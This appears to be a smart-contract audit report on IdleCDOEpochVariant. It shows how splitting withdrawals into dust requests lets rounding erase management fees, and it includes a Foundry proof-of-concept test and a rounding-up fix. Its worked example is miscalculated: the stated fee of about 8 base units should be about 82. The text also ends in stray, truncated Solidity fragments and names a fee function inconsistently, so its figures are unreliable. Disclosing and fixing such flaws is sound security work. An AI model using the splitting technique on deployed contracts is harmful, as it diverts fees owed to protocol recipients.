### Title
Dust withdrawal requests can repeatedly evade upfront management fees - (`contracts/IdleCDOEpochVariant.sol:900`)

### Summary
`IdleCDOEpochVariant.requestWithdraw` charges an upfront management fee for each withdrawal receipt, but `_calculateManagementFee` rounds the result down with no minimum request size. A KYC-passing tranche holder can split a withdrawal into many dust requests during the buffer so each fee rounds to zero while the full net principal is still credited to their withdrawal request. [1](#0-0) [2](#0-1) 

### Finding Description
Withdrawal requests are allowed while the epoch is stopped and are disabled only after `startEpoch`; no phase-specific or minimum-amount guard prevents repeated small requests. [3](#0-2) [4](#0-3) 

For each request, `totalFees` is subtracted from `principal + interest` and added to `pendingWithdrawFees`. [1](#0-0) 

However:

```solidity
_nav * managementFee * _duration / 3153600000000
```

rounds down to zero whenever `principal * managementFee * duration < 3153600000000`. [2](#0-1) 

For example, with `managementFee = 10_000` and an upfront duration of 30 days, every request with principal at or below 121 base units pays zero management fee. A 10,000-base-unit withdrawal split into 100 requests of 100 units should pay approximately 8 base units of management fees, but instead pays zero.

The strategy then mints the user a receipt for the unhaircutted amount and aggregates all dust requests for later settlement. [5](#0-4) [6](#0-5) 

### Impact Explanation
The user receives a withdrawal claim larger than intended, while `pendingWithdrawFees` and later fee distributions lose the avoided amount. In the stated example, each 10,000-base-unit withdrawal diverts approximately 8 base units from fee recipients to the withdrawer; the loss scales linearly with withdrawal volume, subject to gas costs and the number of calls required. [1](#0-0) [7](#0-6) 

### Likelihood Explanation
Any allowed tranche holder can perform the splitting, and `_skimDonatedAssets`, `_updateAccounting`, KYC checks, epoch gating, and receipt bookkeeping do not prevent repeated requests in the same withdrawal phase. Feasibility depends on the underlying token’s base-unit value, configured fee rate, epoch duration, and gas price; higher-value low-decimal underlyings and low-gas environments make the attack more attractive. [8](#0-7) 

### Recommendation
Round nonzero withdrawal management fees up, for example by adding `denominator - 1` before division, and consider enforcing a minimum withdrawal-request amount. The same rounding-up policy should be applied to the performance-fee component in `_netGainAfterFees` so requests cannot obtain a fee-free positive interest component through division truncation. [9](#0-8) 

### Proof of Concept
The following test can be inserted into the existing `test/foundry/IdleCreditVault.t.sol` fixture, which already provides `idleCDO`, `cdoEpoch`, `AAtranche`, `FULL_ALLOC`, `ONE_TRANCHE_TOKEN`, `_setFeeParams`, and `_transferBurnedTrancheTokens`. [10](#0-9) 

```solidity
function testDustWithdrawRequestsAvoidManagementFee() external {
    uint256 dustPrincipal = 100;
    uint256 requests = 100;
    uint256 totalPrincipal = dustPrincipal * requests;

    // 10% annual management fee, no performance fee.
    _setFeeParams(
        TL_MULTISIG,
        0,
        FULL_ALLOC,
        10_000
    );

    // APR0 keeps the assertion isolated to the upfront management fee.
    vm.prank(manager);
    IdleCreditVault(address(strategy)).setAprs(0, 0);

    idleCDO.depositAA(totalPrincipal);
    _transferBurnedTrancheTokens(address(this), true);

    uint256 dustShares =
        dustPrincipal * ONE_TRANCHE_TOKEN /
        cdoEpoch.tranchePrice(address(AAtranche));

    for (uint256 i; i < requests; ++i) {
        uint256 requested = cdoEpoch.requestWithdraw(
            dustShares,
            address(AAtranche)
        );

        // Each request individually rounds its management fee to zero.
        assertEq(requested, dustPrincipal);
    }

    uint256 expectedSingleRequestFee =
        totalPrincipal *
        10_000 *
        cdoEpoch.epochDuration() /
        3153600000000;

    assertGt(expectedSingleRequestFee, 0);
    assertEq(cdoEpoch.pendingWithdrawFees(), 0);

    // The protocol booked no fee, while the attacker retained claim basis for
    // the entire principal.
    assertEq(
        IdleCreditVault(address(strategy)).apr0TotalPrincipal(),
        totalPrincipal
    );
}
```

The assertion that `apr0TotalPrincipal` equals the gross principal while `pendingWithdrawFees` is zero demonstrates the invariant break: each receipt pays no upfront fee despite the aggregate withdrawal having a nonzero fee. [11](#0-10)

  function _netGainAfterFees(uint256 _gain, uint256 _managementFee) private view returns (uint256 netGain) {
    if (_managementFee >= _gain) return netGain;

    _gain -= _managementFee;

  function _calcManagementFee(uint256 _nav, uint256 _rate, uint256 _duration) internal pure returns (uint256) {
    return _nav * _rate * _duration / FULL_ALLOC / 365 days;
  }

  function _withdrawRequestManagementFeeDuration() internal view returns (uint256 duration) {
    duration = cdoEpoch.epochDuration();
    if (duration == 0 || cdoEpoch.epochEndDate() == 0) {
      return duration;
    }

    uint256 bufferEnd = cdoEpoch.epochEndDate() + cdoEpoch.bufferPeriod();
    if (block.timestamp < bufferEnd) {
      duration += bufferEnd - block.timestamp;
    }
  }

  function _setManagementFee(uint256 _managementFee) internal {
